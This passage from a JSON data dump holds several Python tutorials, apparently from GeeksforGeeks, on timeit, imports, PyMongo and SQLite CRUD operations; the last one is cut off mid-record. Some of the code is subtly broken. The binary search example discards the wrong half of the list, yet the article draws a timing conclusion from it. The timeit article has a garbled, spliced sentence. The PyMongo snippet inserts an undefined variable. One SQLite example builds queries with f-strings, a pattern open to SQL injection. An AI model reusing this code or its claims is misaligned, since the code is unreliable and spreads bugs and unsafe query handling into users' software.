    "text": "This article will introduce you to a method of measuring the execution time of your python code snippets.\u00a0We will be using an in-built python library timeit.This module provides a simple way to find the execution time of small bits of Python code.Why timeit?\u00a0\u00a0Well, how about using a simple time module? Just save the time before and after the execution of code and subtract them! But this method is not precise as there might be a background process momentarily running which disrupts the code execution and you will get significant variations in the running time of small code snippets.timeit runs your snippet of code millions of times (default value is 1000000) so that you get the statistically most relevant measurement of code execution time!timeit is pretty simple to use and has a command-line interface as well as a callable one.So now, let\u2019s start exploring this handy library!The module function timeit.timeit(stmt, setup, timer, number) accepts four arguments:\u00a0stmt which is the statement you want to measure; it defaults to \u2018pass\u2019.setup which is the code that you run before running the stmt; it defaults to \u2018pass\u2019.\u00a0We generally use this to import the required modules for our code.timer which is a timeit.Timer object; it usually has a sensible default value so you don\u2019t have to worry about it.number which is the number of executions you\u2019d like to run the stmt.Where the timeit.timeit() function returns the number of seconds it took to execute the code.Example 1Let us see a basic example first.\u00a0\u00a0Python3# importing the required moduleimport timeit\u00a0# code snippet to be executed only oncemysetup = \"from math import sqrt\"\u00a0# code snippet whose execution time is to be measuredmycode = '''def example():\u00a0\u00a0\u00a0\u00a0mylist = []\u00a0\u00a0\u00a0\u00a0for x in range(100):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mylist.append(sqrt(x))'''\u00a0# timeit statementprint (timeit.timeit(setup = mysetup,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0stmt = mycode,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0number = 10000))The output of above program will be the execution time(in seconds) for 10000 iterations of the code snippet passed to timeit.timeit() function.Note: Pay attention to the fact that the output is the execution time of number times iteration of the code snippet, not the single iteration. For a single iteration exec. time, divide the output time by number.The program is pretty straight-forward. All we need to do is to pass the code as a string to the timeit.timeit() function.It is advisable to keep the import statements and other static pieces of code in setup argument.Example 2Let\u2019s see another practical example in which we will compare two searching techniques, namely, Binary search and Linear search.\u00a0Also, here I demonstrate two more features, timeit.repeat function and calling the functions already defined in our program.\u00a0Python3# importing the required modulesimport timeit\u00a0# binary search functiondef binary_search(mylist, find):\u00a0\u00a0\u00a0\u00a0while len(mylist) > 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mid = (len(mylist))//2\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if mylist[mid] == find:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif mylist[mid] < find:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mylist = mylist[:mid]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mylist = mylist[mid + 1:]\u00a0\u00a0\u00a0\u00a0return False\u00a0\u00a0# linear search functiondef linear_search(mylist, find):\u00a0\u00a0\u00a0\u00a0for x in mylist:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if x == find:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0return False\u00a0\u00a0# compute binary search timedef binary_time():\u00a0\u00a0\u00a0\u00a0SETUP_CODE = '''from __main__ import binary_searchfrom random import randint'''\u00a0\u00a0\u00a0\u00a0\u00a0TEST_CODE = '''mylist = [x for x in range(10000)]find = randint(0, len(mylist))binary_search(mylist, find)'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# timeit.repeat statement\u00a0\u00a0\u00a0\u00a0times = timeit.repeat(setup = SETUP_CODE,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0stmt = TEST_CODE,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0repeat = 3,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0number = 10000)\u00a0\u00a0\u00a0\u00a0\u00a0# printing minimum exec. time\u00a0\u00a0\u00a0\u00a0print('Binary search time: {}'.format(min(times)))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# compute linear search timedef linear_time():\u00a0\u00a0\u00a0\u00a0SETUP_CODE = '''from __main__ import linear_searchfrom random import randint'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0TEST_CODE = '''mylist = [x for x in range(10000)]find = randint(0, len(mylist))linear_search(mylist, find)\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0# timeit.repeat statement\u00a0\u00a0\u00a0\u00a0times = timeit.repeat(setup = SETUP_CODE,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0stmt = TEST_CODE,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0repeat = 3,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0number = 10000)\u00a0\u00a0\u00a0\u00a0\u00a0# printing minimum exec. time\u00a0\u00a0\u00a0\u00a0print('Linear search time: {}'.format(min(times)))\u00a0\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0linear_time()\u00a0\u00a0\u00a0\u00a0binary_time()The output of above program will be the minimum value in the list times.\u00a0This is how a sample output looks like:\u00a0strate below how you can utilize the command lintimeit.repeat() function accepts one extra argument, repeat. The output will be a list of the execution times of all code runs repeated a specified no. of times.In setup argument, we passed:\u00a0from __main__ import binary_search\nfrom random import randintThis will import the definition of function binary_search, already defined in the program and random library function randint.As expected, we notice that execution time of binary search is significantly lower than linear search!Example 3\u00a0Finally, I demonstrate below how you can utilize the command line interface of timeit module:Here I explain each term individually:\u00a0\u00a0So, this was a brief yet concise introduction to timeit module and its practical applications.\u00a0Its a pretty handy tool for python programmers when they need a quick glance of the execution time of their code snippets.This article is contributed by Nikhil Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c72a0194e016cd9045ae92cbfbdfe9f0",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Import in python is similar to #include header_file in C/C++. Python modules can get access to code from another module by importing the file/function using import. The import statement is the most common way of invoking the import machinery, but it is not the only way.import module_name\u00a0When the import is used, it searches for the module initially in the local scope by calling __import__() function. The value returned by the function is then reflected in the output of the initial code.\u00a0PYTHONimport mathprint(math.pi)Output:3.141592653589793import module_name.member_name\u00a0In the above code module, math is imported, and its variables can be accessed by considering it to be a class and pi as its object.\u00a0The value of pi is returned by __import__().\u00a0pi as a whole can be imported into our initial code, rather than importing the whole module.\u00a0PYTHONfrom math import pi\u00a0# Note that in the above example,# we used math.pi. Here we have used# pi directly.print(pi)Output:3.141592653589793\u00a0from module_name import *\u00a0In the above code module, math is not imported, rather just pi has been imported as a variable.\u00a0All the functions and constants can be imported using *.\u00a0PYTHONfrom math import *print(pi)print(factorial(6))Output:3.141592653589793\n720As said above import uses __import__() to search for the module, and if not found, it would raise ImportError\u00a0PYTHONimport mathematicsprint(mathematics.pi)Output:Traceback (most recent call last):\n  File \"C:/Users/GFG/Tuples/xxx.py\", line 1, in \n    import mathematics\nImportError: No module named 'mathematics'This article is contributed by Piyush Doorwar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d255826d5388c2af9f1db1542c3e2b42",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite : MongoDB : An introductionMongoDB is a cross-platform, document-oriented database that works on the concept of collections and documents. MongoDB offers high speed, high availability, and high scalability.The next question which arises in the mind of the people is \u201cWhy MongoDB\u201d?Reasons to opt for MongoDB :It supports hierarchical data structure (Please refer docs for details)It supports associate arrays like Dictionaries in Python.Built-in Python drivers to connect python-application with Database. Example- PyMongoIt is designed for Big Data.Deployment of MongoDB is very easy.MongoDB vs RDBMSMongoDB and PyMongo Installation GuideFirst start MongoDB from command prompt using :Method 1:mongodorMethod 2:net start MongoDBSee port number by default is set 27017 (last line in above image).Python has a native library for MongoDB. The name of the available library is \u201cPyMongo\u201d. To import this, execute the following command:from pymongo import MongoClientCreate a connection : The very first after importing the module is to create a MongoClient.from pymongo import MongoClientclient = MongoClient()After this, connect to the default host and port. Connection to the host and port is done explicitly. The following command is used to connect the MongoClient on the localhost which runs on port number 27017.client = MongoClient(\u2018host\u2019, port_number)example:- client = MongoClient(\u2018localhost\u2019, 27017)It can also be done using the following command:client = MongoClient(\u201cmongodb://localhost:27017/\u201d)Access DataBase Objects : To create a database or switch to an existing database we use:Method 1 : Dictionary-stylemydatabase = client[\u2018name_of_the_database\u2019]Method2 :mydatabase = client.name_of_the_databaseIf there is no previously created database with this name, MongoDB will implicitly create one for the user.Note : The name of the database fill won\u2019t tolerate any dash (-) used in it. The names like my-Table will raise an error. So, underscore are permitted to use in the name.Accessing the Collection : Collections are equivalent to Tables in RDBMS. We access a collection in PyMongo in the same way as we access the Tables in the RDBMS. To access the table, say table name \u201cmyTable\u201d of the database, say \u201cmydatabase\u201d.Method 1:mycollection = mydatabase[\u2018myTable\u2019]Method 2 :mycollection = mydatabase.myTable>MongoDB store the database in the form of dictionaries as shown:>\r\nrecord = {\r\ntitle: 'MongoDB and Python', \r\ndescription: 'MongoDB is no SQL database', \r\ntags: ['mongodb', 'database', 'NoSQL'], \r\nviewers: 104 \r\n} \u2018_id\u2019 is the special key which get automatically added if the programmer forgets to add explicitly. _id is the 12 bytes hexadecimal number which assures the uniqueness of every inserted document.Insert the data inside a collection :Methods used:insert_one() or insert_many()We normally use insert_one() method document into our collections. Say, we wish to enter the data named as record into the \u2019myTable\u2019 of \u2018mydatabase\u2019.rec = myTable.insert_one(record)The whole code looks likes this when needs to be implemented.# importing modulefrom pymongo import MongoClient\u00a0\u00a0# creation of MongoClientclient=MongoClient()\u00a0\u00a0# Connect with the portnumber and hostclient = MongoClient(\u201cmongodb://localhost:27017/\u201d)\u00a0\u00a0# Access databasemydatabase = client[\u2018name_of_the_database\u2019]\u00a0\u00a0# Access collection of the databasemycollection=mydatabase[\u2018myTable\u2019]\u00a0\u00a0# dictionary to be added in the databaserec={title: 'MongoDB and Python',\u00a0description: 'MongoDB is no SQL database',\u00a0tags: ['mongodb', 'database', 'NoSQL'],\u00a0viewers: 104\u00a0}\u00a0\u00a0# inserting the data in the databaserec = mydatabase.myTable.insert(record)Querying in MongoDB : There are certain query functions which are used to filer the data in the database. The two most commonly used functions are:find()find() is used to get more than one single document as a result of query.for i in mydatabase.myTable.find({title: 'MongoDB and Python'})\u00a0\u00a0\u00a0\u00a0print(i)This will output all the documents in the myTable of mydatabase whose title is \u2018MongoDB and Python\u2019.count()count() is used to get the numbers of documents with the name as passed int he parameters.print(mydatabase.myTable.count({title: 'MongoDB and Python'}))This will output the numbers of documents in the myTable of mydatabase whose title is \u2018MongoDB and Python\u2019.These two query functions can be summed to give a give the most filtered result as shown below.print(mydatabase.myTable.find({title: 'MongoDB and Python'}).count())To print all the documents/entries inside \u2018myTable\u2019 of database \u2018mydatabase\u2019 : Use the following code:from pymongo import MongoClient\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0conn = MongoClient()\u00a0\u00a0\u00a0\u00a0print(\"Connected successfully!!!\")except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Could not connect to MongoDB\")\u00a0\u00a0# database name: mydatabasedb = conn.mydatabase\u00a0\u00a0# Created or Switched to collection names: myTablecollection = db.myTable\u00a0\u00a0# To find() all the entries inside collection name 'myTable'cursor = collection.find()for record in cursor:\u00a0\u00a0\u00a0\u00a0print(record)This article is contributed by Rishabh Bansal and Shaurya Uppal.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "645d00cb399278c7fe8b5fbcf80db40d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, integrating SQLite3 with Python is discussed. Here we will discuss all the CRUD operations on the SQLite3 database using Python. CRUD contains four major operations \u2013\u00a0Note: This needs a basic understanding of SQL.\u00a0Here, we are going to connect SQLite with Python. Python has a native library for SQLite3 called sqlite3. Let us explain how it works.\u00a0Connecting to SQLite DatabaseTo use SQLite, we must import sqlite3.import sqlite3Then create a connection using connect() method and pass the name of the database you want to access if there is a file with that name, it will open that file. Otherwise, Python will create a file with the given name.sqliteConnection = sqlite3.connect('gfg.db')After this, a cursor object is called to be capable to send commands to the SQL.\u00a0cursor = sqliteConnection.cursor()Example: Connecting to SQLite3 database using PythonPython3import sqlite3\u00a0\u00a0# connecting to the databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursorcrsr = connection.cursor()\u00a0\u00a0# print statement will execute if there# are no errorsprint(\"Connected to the database\")\u00a0\u00a0# close the connectionconnection.close()Output:Connected to the databaseCursor ObjectBefore moving further to SQLite3 and Python let\u2019s discuss the cursor object in brief.\u00a0The cursor object is used to make the connection for executing SQL queries.It acts as middleware between SQLite database connection and SQL query. It is created after giving connection to SQLite database.\u00a0The cursor is a control structure used to traverse and fetch the records of the database.\u00a0All the commands will be executed using cursor object only.Executing SQLite3 Queries \u2013 Creating TablesAfter connecting to the database and creating the cursor object let\u2019s see how to execute the queries.To execute a query in the database, create an object and write the SQL command in it with being commented. Example:- sql_comm = \u201dSQL statement\u201dAnd executing the command is very easy. Call the cursor method execute() and pass the name of the sql command as a parameter in it. Save a number of commands as the sql_comm and execute them. After you perform all your activities, save the changes in the file by committing those changes and then lose the connection.\u00a0Example: Creating SQLite3 tables using PythonIn this example, we will create the SQLite3 tables using Python. The standard SQL command will be used for creating the tables.Pythonimport sqlite3\u00a0\u00a0# connecting to the databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursorcrsr = connection.cursor()\u00a0\u00a0# SQL command to create a table in the databasesql_command = \"\"\"CREATE TABLE emp (\u00a0staff_number INTEGER PRIMARY KEY,\u00a0fname VARCHAR(20),\u00a0lname VARCHAR(30),\u00a0gender CHAR(1),\u00a0joining DATE);\"\"\"\u00a0\u00a0# execute the statementcrsr.execute(sql_command)\u00a0\u00a0# close the connectionconnection.close()Output:Inserting into TableTo insert data into the table we will again write the SQL command as a string and will use the execute() method.Example 1: Inserting Data into SQLite3 table using PythonPython3# Python code to demonstrate table creation and# insertions with SQL\u00a0\u00a0# importing moduleimport sqlite3\u00a0\u00a0# connecting to the databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursorcrsr = connection.cursor()\u00a0\u00a0# SQL command to insert the data in the tablesql_command = \"\"\"INSERT INTO emp VALUES (23, \"Rishabh\",\\\"Bansal\", \"M\", \"2014-03-28\");\"\"\"crsr.execute(sql_command)\u00a0\u00a0# another SQL command to insert the data in the tablesql_command = \"\"\"INSERT INTO emp VALUES (1, \"Bill\", \"Gates\",\\\"M\", \"1980-10-28\");\"\"\"crsr.execute(sql_command)\u00a0\u00a0# To save the changes in the files. Never skip this.# If we skip this, nothing will be saved in the database.connection.commit()\u00a0\u00a0# close the connectionconnection.close()Output:Example 2: Inserting data input by the userPython3# importing moduleimport sqlite3\u00a0\u00a0# connecting to the databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursorcrsr = connection.cursor()\u00a0\u00a0# primary keypk = [2, 3, 4, 5, 6]\u00a0\u00a0# Enter 5 students first namesf_name = ['Nikhil', 'Nisha', 'Abhinav', 'Raju', 'Anshul']\u00a0\u00a0# Enter 5 students last namesl_name = ['Aggarwal', 'Rawat', 'Tomar', 'Kumar', 'Aggarwal']\u00a0\u00a0# Enter their gender respectivelygender = ['M', 'F', 'M', 'M', 'F']\u00a0\u00a0# Enter their jpining data respectivelydate = ['2019-08-24', '2020-01-01', '2018-05-14', '2015-02-02', '2018-05-14']\u00a0\u00a0for i in range(5):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# This is the q-mark style:\u00a0\u00a0\u00a0\u00a0crsr.execute(f'INSERT INTO emp VALUES ({pk[i]}, \"{f_name[i]}\", \"{l_name[i]}\", \"{gender[i]}\", \"{date[i]}\")')\u00a0\u00a0# To save the changes in the files. Never skip this.# If we skip this, nothing will be saved in the database.connection.commit()\u00a0\u00a0# close the connectionconnection.close()Output:Fetching DataIn this section, we have discussed how to create a table and how to add new rows in the database. Fetching the data from records is simple as inserting them. The execute method uses the SQL command of getting all the data from the table using \u201cSelect * from table_name\u201d and all the table data can be fetched in an object in the form of a list of lists.Example: Reading Data from sqlite3 table using PythonPython# importing the moduleimport sqlite3\u00a0\u00a0# connect withe the myTable databaseconnection = sqlite3.connect(\"gfg.db\")\u00a0\u00a0# cursor objectcrsr = connection.cursor()\u00a0\u00a0# execute the command to fetch all the data from the table empcrsr.execute(\"SELECT * FROM emp\")\u00a0\u00a0# store all the fetched data in the ans variableans = crsr.fetchall()\u00a0\u00a0# Since we have already selected all the data entries# using the \"SELECT *\" SQL command and stored them in# the ans variable, all we need to do now is to print# out the ans variablefor i in ans:\u00a0\u00a0\u00a0\u00a0print(i)Output:Note: It should be noted that the database file that will be created will be in the same folder as that of the python file. If we wish to change the path of the file, change the path while opening the file.Updating DataFor updating the data in the SQLite3 table we will use the UPDATE statement. We can update single columns as well as multiple columns using the UPDATE statement as per our requirement.UPDATE table_name SET column1 = value1, column2 = value2,\u2026  \r\nWHERE condition; In the above syntax, the SET statement is used to set new values to the particular column, and the WHERE clause is used to select the rows for which the columns are needed to be updated.\u00a0Example: Updating SQLite3 table using PythonPython3# Import moduleimport sqlite3\u00a0\u00a0# Connecting to sqliteconn = sqlite3.connect('gfg.db')\u00a0\u00a0# Creating a cursor object using# the cursor() methodcursor = conn.cursor()\u00a0\u00a0# Updatingcursor.execute('''UPDATE emp SET lname = \"Jyoti\" WHERE fname=\"Rishabh\";''')\u00a0\u00a0# Commit your changes in the databaseconn.commit()\u00a0\u00a0# Closing the connectionconn.close()Output:Deleting DataFor deleting the data from the SQLite3 table we can use the delete command.\u00a0DELETE FROM table_name [WHERE Clause]Example: Deleting from SQLite3 table using PythonPython3# Import moduleimport sqlite3\u00a0\u00a0# Connecting to sqliteconn = sqlite3.connect('gfg.db')\u00a0\u00a0# Creating a cursor object using# the cursor() methodcursor = conn.cursor()\u00a0\u00a0# Updatingcursor.execute('''DELETE FROM emp WHERE fname=\"Rishabh\";''')\u00a0\u00a0# Commit your changes in the databaseconn.commit()\u00a0\u00a0# Closing the connectionconn.close()Output:Deleting TableDROP is used to delete the entire database or a table. It deleted both records in the table along with the table structure.Syntax:\u00a0DROP TABLE TABLE_NAME;Example: Drop SQLite3 table using PythonTotal tables in the gfg.db before droppingNow let\u2019s drop the Student table and then again check the total table in our database.Python3# Import moduleimport sqlite3\u00a0\u00a0# Connecting to sqliteconn = sqlite3.connect('gfg.db')\u00a0\u00a0# Creating a cursor object using# the cursor() methodcursor = conn.cursor()\u00a0\u00a0# Updatingcursor.execute('''DROP TABLE Student;''')\u00a0\u00a0# Commit your changes in the databaseconn.commit()\u00a0\u00a0# Closing the connectionconn.close()Output:Note: To learn more about SQLit3 with Python refer to our Python SQLite3 Tutorial.\u00a0This article is contributed by Rishabh Bansal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "bed9ef54784ea93bae9bbbf160941b05",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Databases offer numerous functionalities by which one can manage large amounts of information easily over the web, and high-volume data input and output over a typical file such as a text file. SQL is a query language and is very popular in databases. Many websites use MySQL. SQLite is a \u201clight\u201d version that works over syntax very much similar to SQL.SQLite is a self-contained, high-reliability, embedded, full-featured, public-domain, SQL database engine. It is the most used database engine in the world wide web.Python has a library to access SQLite databases, called sqlite3, intended for working with this database which has been included with Python package since version 2.5.In this article we will discuss, how to query database using commands like Update and Delete and also to visualize data via graphs.It is recommended to go through SQL using Python | Set 1Updation and Deletion Operation# code for update operationimport sqlite3\u00a0\u00a0# database name to be passed as parameterconn = sqlite3.connect('mydatabase.db')\u00a0\u00a0# update the student recordconn.execute(\"UPDATE Student SET name = 'Sam' where unix='B113059'\")conn.commit()\u00a0\u00a0print \"Total number of rows updated :\", conn.total_changes\u00a0\u00a0cursor = conn.execute(\"SELECT * FROM Student\")for row in cursor:\u00a0\u00a0\u00a0print row,\u00a0\u00a0conn.close()Output:\r\nTotal number of rows updated : 1\r\n(u'B113053', u'Geek', u'2017-01-11 13:53:39', 21.0), \r\n(u'B113058', u'Saan', u'2017-01-11 13:53:39', 21.0), \r\n(u'B113059', u'Sam', u'2017-01-11 13:53:39', 22.0)\r\n# code for delete operationimport sqlite3\u00a0\u00a0# database name to be passed as parameterconn = sqlite3.connect('mydatabase.db')\u00a0\u00a0# delete student record from databaseconn.execute(\"DELETE from Student where unix='B113058'\")conn.commit()print \"Total number of rows deleted :\", conn.total_changes\u00a0\u00a0cursor = conn.execute(\"SELECT * FROM Student\")for row in cursor:\u00a0\u00a0\u00a0print row,\u00a0\u00a0conn.close()Output:\r\nTotal number of rows deleted : 1\r\n(u'B113053', u'Geek', u'2017-01-11 13:53:39', 21.0),\r\n (u'B113059', u'Sam', u'2017-01-11 13:53:39', 22.0)\r\nData input by User# code for executing query using input dataimport sqlite3\u00a0\u00a0# creates a database in RAMcon = sqlite3.connect(\":memory:\")cur = con.cursor()cur.execute(\"create table person (name, age, id)\")\u00a0\u00a0print (\"Enter 5 students names:\")who = [raw_input() for i in range(5)]print (\"Enter their ages respectively:\")age = [int(raw_input()) for i in range(5)]print (\"Enter their ids respectively:\")p_id = [int(raw_input()) for i in range(5)]n = len(who)\u00a0\u00a0for i in range(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# This is the q-mark style:\u00a0\u00a0\u00a0\u00a0cur.execute(\"insert into person values (?, ?, ?)\", (who[i], age[i], p_id[i]))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# And this is the named style:\u00a0\u00a0\u00a0\u00a0cur.execute(\"select * from person\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Fetches all entries from table\u00a0\u00a0\u00a0\u00a0print cur.fetchall()Output:\r\n(u'Navin', 34, 113053)\r\n(u'Basu', 42, 113058)\r\n(u'Firoz', 65, 113059)\r\n(u'Tim', 47, 113060)\r\n(u'Varun', 54, 113061)\r\nGraphing with SQLite# graph visualization using matplotlib libraryimport matplotlib.pyplot as plt\u00a0\u00a0def graph_data(p_id,age):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# plotting the points\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0plt.plot(p_id, age, color='yellow', linestyle='dashed', linewidth = 3,\u00a0\u00a0\u00a0\u00a0marker='*', markerfacecolor='blue', markersize=12)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# naming the x axis\u00a0\u00a0\u00a0\u00a0plt.xlabel('Persons Id')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# naming the y axis\u00a0\u00a0\u00a0\u00a0plt.ylabel('Ages')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# plt.plot(p_id,age)\u00a0\u00a0\u00a0\u00a0plt.show()\u00a0\u00a0print (\"Enter 5 students names:\")who = [raw_input() for i in range(5)]print (\"Enter their ages respectively:\")age = [int(raw_input()) for i in range(5)]print (\"Enter their ids respectively:\")p_id = [int(raw_input()) for i in range(5)]\u00a0\u00a0# calling graph functiongraph_data(p_id,age)In this way we can perform such operations using SQL query to communicate with Database and plot a Graph significantly to draw out its characteristic.SQL using Python | Set 1SQL using Python | Set 3 (Handling large data)My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6aca5d8ccaa165b82d3afcd507d4b9f9",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "It is recommended to go through SQL using Python | Set 1 and SQL using Python and SQLite | Set 2In the previous articles the records of the database were limited to small size and single tuple. This article will explain how to write & fetch large data from the database using module SQLite3 covering all exceptions.A simple way is to execute the query and use fetchall(). This has been already discussed in SET 1.executescript()This is a convenience method for executing multiple SQL statements at once. It executes the SQL script it gets as a parameter.Syntax:sqlite3.connect.executescript(script)import sqlite3\u00a0\u00a0# Connection with the DataBase# 'library.db'connection = sqlite3.connect(\"library.db\")cursor = connection.cursor()\u00a0\u00a0# SQL piece of code Executed# SQL piece of code Executedcursor.executescript(\"\"\"\u00a0\u00a0\u00a0\u00a0CREATE TABLE people(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0firstname,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lastname,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0age\u00a0\u00a0\u00a0\u00a0);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CREATE TABLE book(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0author,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0published\u00a0\u00a0\u00a0\u00a0);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0INSERT INTO\u00a0\u00a0\u00a0\u00a0book(title, author, published)\u00a0\u00a0\u00a0\u00a0VALUES (\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Dan Clarke''s GFG Detective Agency',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Sean Simpsons',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01987\u00a0\u00a0\u00a0\u00a0);\u00a0\u00a0\u00a0\u00a0\"\"\")\u00a0\u00a0sql = \"\"\"SELECT COUNT(*) FROM book;\"\"\"\u00a0\u00a0cursor.execute(sql)\u00a0\u00a0# The output in fetched and returned# as a List by fetchall()result = cursor.fetchall()print(result)\u00a0\u00a0sql = \"\"\"SELECT * FROM book;\"\"\"\u00a0\u00a0cursor.execute(sql)\u00a0\u00a0result = cursor.fetchall()print(result)\u00a0\u00a0# Changes saved into databaseconnection.commit()\u00a0\u00a0# Connection closed(broken)\u00a0# with DataBaseconnection.close()Output:\r\n[(1,)]\r\n[(\"Dan Clarke's GFG Detective Agency\", 'Sean Simpsons', 